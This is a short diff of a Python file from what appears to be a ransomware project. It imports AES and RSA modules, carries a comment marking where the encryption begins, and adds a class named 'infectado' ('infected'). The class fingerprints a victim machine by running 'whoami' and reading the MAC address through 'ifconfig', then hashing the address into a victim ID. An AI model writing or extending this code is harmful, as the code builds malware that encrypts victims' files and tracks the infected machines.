@@ -8,12 +8,36 @@ import socket
 from random import choice
 import getpass
 import sys
-import shutil
+import json
+import subprocess
+import hashlib
 
 from AES import *
 from RSA import *
 from SRSA import *
 
+class infectado():
+    def __init__(self):
+        self.nome_pc = None
+        self.id = None
+
+    def get_name(self):
+        self.comando = subprocess.Popen('whoami', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.nome_pc = self.comando.stdout.read()
+
+    def get_id(self):
+        self.comando = subprocess.Popen('ifconfig -a | grep ether', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.saida = self.comando.stdout.read()
+        self.s = self.saida.split()
+        self.mac_addr = self.s[1]
+        self.id = hashlib.sha256(self.mac_addr).hexdigest()
+    '''
+    a = infectado()
+    a.get_name()
+    print(a.nome_pc)
+    a.get_id ()
+    print(a.id)
+    '''
 
 # ponto de partida da criptografia
 def menu(senha_AES):
